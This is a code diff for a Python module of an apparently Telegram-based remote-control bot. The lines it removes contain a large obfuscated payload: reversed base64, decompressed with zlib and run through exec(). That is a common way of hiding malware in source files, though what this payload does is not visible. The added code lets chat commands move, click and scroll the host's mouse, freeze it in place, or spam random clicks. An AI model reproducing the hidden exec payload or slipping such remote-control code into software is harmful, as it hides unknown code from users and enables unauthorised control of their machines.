@@ -3,10 +3,223 @@ import time
 import random
 import constants
 from modules import Screen
+import config
+from command_registry import registry
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+async def leftclick_callback(bot, call):
+
+    markup = getMarkupModes()
+
+    left_click()
+
+    await send_message(bot, call.message.chat.id, text=constants.mouse_clicked_message, reply_markup=markup)
 
 
-exec((_)(b'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'))
+async def rightclick_callback(bot, call):
+    markup = getMarkupModes()
+
+    right_click()
+
+    await send_message(bot, call.message.chat.id, text=constants.mouse_clicked_message, reply_markup=markup)
+
+
+async def doubleclick_callback(bot, call):
+    markup = getMarkupModes()
+
+    double_click()
+
+    await send_message(bot, call.message.chat.id, text=constants.mouse_clicked_message, reply_markup=markup)
+
+
+async def pressmouse_callback(bot, call):
+    markup = getMarkupModes()
+
+    press()
+
+    await send_message(bot, call.message.chat.id, text=constants.mousepress_pressed_message, reply_markup=markup)
+
+
+async def unpressmouse_callback(bot, call):
+    markup = getMarkupModes()
+
+    unpress()
+
+    await send_message(bot, call.message.chat.id, text=constants.mouseunpress_unpressed_message, reply_markup=markup)
+
+
+async def getposition_callback(bot, call):
+    markup = getMarkupModes()
+
+    x, y = get_position()
+
+    await send_message(bot, call.message.chat.id, text=f"{x} {y}", reply_markup=markup)
+
+
+async def blockmouse_callback(bot, call):
+    message = constants.MOUSE_BLOCK_documentation.format(
+        max_time_to_mouse=config.max_time_to_mouse_block)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
+
+
+async def spammouse_callback(bot, call):
+    message = constants.MOUSE_SPAM_documentation.format(
+        max_time_to_mouse=config.max_time_to_mouse_spam)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.MOUSE_MOVE_command,
+    permission_name=constants.MOUSE_MOVE,
+)
+async def movemouse(bot, message):
+
+    markup = getMarkupModes()
+
+    coordinates = getarg(message.text, constants.MOUSE_MOVE_command).split()
+
+    if len(coordinates) != 2 or not (coordinates[0].isdigit() and coordinates[1].isdigit()):
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    move(int(coordinates[0]), int(coordinates[1]))
+
+    await send_message(bot, message.chat.id, text=constants.movemouse_moved_message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.MOUSE_SCROLL_command,
+    permission_name=constants.MOUSE_SCROLL,
+)
+async def scrollmouse(bot, message):
+    markup = getMarkupModes()
+
+    scroll_key = getarg(message.text, constants.MOUSE_SCROLL_command)
+
+    if not (scroll_key.isdigit() or (len(scroll_key) >= 2 and scroll_key[0] == '-' and scroll_key[1:].isdigit())):
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    scroll(int(scroll_key))
+
+    await send_message(bot, message.chat.id, text=constants.scrollmouse_scrolled_message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.MOUSE_BLOCK_command,
+    permission_name=constants.MOUSE_BLOCK,
+)
+async def blockmouse(bot, message):
+    time_working = getarg(message.text, constants.MOUSE_BLOCK_command)
+    markup = getMarkupModes()
+
+    if not time_working.isdigit() or int(time_working) > config.max_time_to_mouse_block:
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    await send_message(bot, message.chat.id, text=constants.blockmouse_blocked_message)
+
+    block_mouse(time_working)
+
+    await send_message(bot, message.chat.id, text=constants.blockmouse_unblocked_message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.MOUSE_SPAM_command,
+    permission_name=constants.MOUSE_SPAM,
+)
+async def mousespam(bot, message):
+    time_working = getarg(message.text, constants.MOUSE_SPAM_command)
+    markup = getMarkupModes()
+
+    if not time_working.isdigit() or int(time_working) > config.max_time_to_mouse_spam:
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    await send_message(bot, message.chat.id, text=constants.mousespam_started_message)
+
+    spam_mouse(time_working)
+
+    await send_message(bot, message.chat.id, text=constants.mousespam_finished_message, reply_markup=markup)
+
+
+mouse = Controller()
+
+
+def move(x, y):
+    mouse.position = (x, y)
+
+
+def right_click():
+    mouse.click(Button.right)
+
+
+def left_click():
+    mouse.click(Button.left)
+
+
+def double_click():
+    mouse.click(Button.left, 2)
+
+
+def press():
+    mouse.press(Button.left)
+
+
+def unpress():
+    mouse.release(Button.left)
+
+
+def get_position():
+    return mouse.position
+
+
+def scroll(key):
+    mouse.scroll(0, key)
+
+
+def block_mouse(time_working):
+    start_time = time.time()
+    x, y = get_position()
+
+    while True:
+        end_time = time.time()
+
+        if end_time - start_time >= int(time_working):
+            break
+
+        move(x, y)
+
+
+def spam_mouse(time_working):
+    display = Screen.get_size()
+    start_time = time.time()
+
+    while True:
+        x, y = random.randint(0, display[0]), random.randint(0, display[1])
+
+        end_time = time.time()
+
+        if end_time - start_time >= int(time_working):
+            break
+
+        move(x, y)
+
+        functions = [left_click, right_click, double_click,
+                     lambda: scroll(random.randint(1, 100))]
+        function = random.choice(functions)
+        function()
+
+
+modes = {constants.MOUSE_MOVE_preview: constants.MOUSE_MOVE, constants.MOUSE_LEFTCLICK_preview: constants.MOUSE_LEFTCLICK,
+         constants.MOUSE_RIGHTCLICK_preview: constants.MOUSE_RIGHTCLICK, constants.MOUSE_DOUBLECLICK_preview: constants.MOUSE_DOUBLECLICK,
+         constants.MOUSE_PRESS_preview: constants.MOUSE_PRESS, constants.MOUSE_UNPRESS_preview: constants.MOUSE_UNPRESS,
+         constants.MOUSE_GETPOSITION_preview: constants.MOUSE_GETPOSITION, constants.MOUSE_SCROLL_preview: constants.MOUSE_SCROLL,
+         constants.MOUSE_BLOCK_preview: constants.MOUSE_BLOCK, constants.MOUSE_SPAM_preview: constants.MOUSE_SPAM}
